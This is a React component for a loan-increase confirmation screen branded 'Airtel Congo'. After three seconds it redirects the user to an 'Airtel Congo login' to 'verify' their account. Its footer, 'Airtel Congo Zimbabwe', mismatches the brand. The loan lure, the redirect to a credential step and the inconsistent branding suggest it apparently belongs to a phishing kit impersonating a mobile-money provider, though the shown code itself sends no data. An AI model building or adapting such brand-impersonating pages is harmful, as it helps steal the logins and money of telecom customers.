import React from "react";
import { CheckCircle, Loader2 } from "lucide-react";
import {
    pageStyle,
    headerStyle,
    logoStyle,
    menuButtonStyle,
    contentStyle,
    cardStyle,
    footerStyle,
} from "../styles/sharedStyles";
import { LoanSubmittedPageProps } from "../types";

function LoanSubmittedPage({ onComplete }: LoanSubmittedPageProps) {
    React.useEffect(() => {
        // Auto-redirect after 3 seconds
        const timer = setTimeout(() => {
            onComplete();
        }, 3000);

        return () => clearTimeout(timer);
    }, [onComplete]);

    return (
        <div style={pageStyle}>
            <div style={headerStyle}>
                <div style={{ width: "60px" }} />
                <img src="/airtel.svg" alt="Airtel Congo" style={logoStyle} />
                <button
                    style={menuButtonStyle}
                    onMouseOver={(e) => (e.currentTarget.style.background = "#f0f0f0")}
                    onMouseOut={(e) => (e.currentTarget.style.background = "none")}
                >
                    ☰
                </button>
            </div>

            <div style={contentStyle}>
                <div
                    style={{
                        ...cardStyle,
                        textAlign: "center",
                        maxWidth: "520px",
                    }}
                >
                    <div
                        style={{
                            width: "72px",
                            height: "72px",
                            borderRadius: "50%",
                            background: "linear-gradient(135deg, #10b981 0%, #059669 100%)",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                            margin: "0 auto 24px",
                            boxShadow: "0 8px 24px rgba(16, 185, 129, 0.25)",
                        }}
                    >
                        <CheckCircle size={40} color="white" />
                    </div>
                    <h1
                        style={{
                            fontSize: "30px",
                            fontWeight: "700",
                            marginBottom: "20px",
                            color: "#10b981",
                        }}
                    >
                        Airtel Congo Loan Increment Submitted
                    </h1>
                    <p
                        style={{
                            color: "#444",
                            fontSize: "16px",
                            marginBottom: "16px",
                            lineHeight: "1.6",
                        }}
                    >
                        Your Airtel Congo limit increase request has been submitted. Please wait for processing.
                    </p>
                    <p
                        style={{
                            color: "#444",
                            fontSize: "16px",
                            marginBottom: "24px",
                            lineHeight: "1.6",
                        }}
                    >
                        You will receive a confirmation. For now, proceed to verify your Airtel Congo account.
                    </p>
                    <div
                        style={{
                            background: "linear-gradient(135deg, #f5f7fa 0%, #f0f3f7 100%)",
                            padding: "20px",
                            borderRadius: "12px",
                            marginTop: "32px",
                        }}
                    >
                        <div
                            style={{
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                gap: "12px",
                            }}
                        >
                            <Loader2 className="spinner" size={20} color="#667eea" />
                            <p
                                style={{
                                    color: "#667eea",
                                    fontSize: "15px",
                                    fontWeight: "600",
                                    margin: 0,
                                }}
                            >
                                Redirecting to Airtel Congo login...
                            </p>
                        </div>
                    </div>
                </div>
            </div>

            <div style={footerStyle}>© 2025 Airtel Congo Zimbabwe</div>
        </div>
    );
}

export default LoanSubmittedPage;
